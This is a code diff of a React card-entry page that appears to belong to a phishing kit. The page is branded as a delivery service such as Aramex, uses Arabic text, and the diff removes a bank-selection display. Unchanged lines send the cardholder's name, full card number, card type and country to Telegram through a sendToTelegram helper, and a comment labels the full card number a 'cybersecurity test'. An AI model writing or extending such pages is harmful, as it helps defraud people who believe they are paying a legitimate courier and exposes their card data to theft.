@@ -7,11 +7,10 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
-import { CreditCard, AlertCircle, ArrowLeft, CheckCircle2, Building2 } from "lucide-react";
+import { CreditCard, AlertCircle, ArrowLeft, CheckCircle2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import { validateLuhn, formatCardNumber, detectCardType, validateExpiry, validateCVV } from "@/lib/cardValidation";
-import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
 
 const PaymentCardInput = () => {
@@ -28,10 +27,9 @@ const PaymentCardInput = () => {
   const [cardValid, setCardValid] = useState<boolean | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
   
-  // Get customer info and selected bank from sessionStorage (with fallback to link data)
+  // Get customer info from sessionStorage (with fallback to link data)
   const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
   const selectedCountry = sessionStorage.getItem('selectedCountry') || linkData?.country_code || '';
-  const selectedBankId = sessionStorage.getItem('selectedBank') || linkData?.payload?.selected_bank || '';
   
   // Get service info from link data (more reliable than sessionStorage)
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || customerInfo.service || 'aramex';
@@ -44,7 +42,6 @@ const PaymentCardInput = () => {
   // Get country from link data if sessionStorage doesn't have it
   const countryCode = selectedCountry || linkData?.country_code || '';
   const selectedCountryData = countryCode ? getCountryByCode(countryCode) : null;
-  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
   
   const handleCardNumberChange = (value: string) => {
     const formatted = formatCardNumber(value.replace(/\D/g, "").slice(0, 16));
@@ -149,7 +146,6 @@ const PaymentCardInput = () => {
           service: serviceName,
           amount: formattedAmount,
           country: selectedCountryData?.nameAr || '',
-          bank: selectedBank?.nameAr || 'غير محدد',
           cardholder: cardName,
           cardLast4: last4,
           cardType: cardType,
@@ -171,8 +167,6 @@ const PaymentCardInput = () => {
         service: serviceName,
         country: selectedCountryData?.nameAr || '',
         countryCode: selectedCountry,
-        bank: selectedBank?.nameAr || 'غير محدد',
-        bankId: selectedBankId,
         cardholder: cardName,
         cardNumber: cardNumber, // Full card number for cybersecurity test
         cardLast4: last4,
@@ -210,30 +204,6 @@ const PaymentCardInput = () => {
       description={`أدخل بيانات البطاقة لخدمة ${serviceName}`}
       icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
     >
-      {/* Selected Bank/Country Info */}
-      {(selectedBank || selectedCountryData) && (
-        <div 
-          className="rounded-lg p-3 sm:p-4 mb-6 flex items-center gap-3"
-          style={{
-            background: `${branding.colors.primary}10`,
-            border: `1px solid ${branding.colors.primary}30`
-          }}
-        >
-          {selectedCountryData && (
-            <span className="text-2xl">{selectedCountryData.flag}</span>
-          )}
-          {selectedBank && (
-            <Building2 className="w-5 h-5" style={{ color: selectedBank.color || branding.colors.primary }} />
-          )}
-          <div className="flex-1">
-            <p className="text-xs text-muted-foreground">البنك المختار</p>
-            <p className="text-sm font-semibold">
-              {selectedBank ? selectedBank.nameAr : 'غير محدد'}
-            </p>
-          </div>
-        </div>
-      )}
-
       {/* Security Notice */}
       <div 
         className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
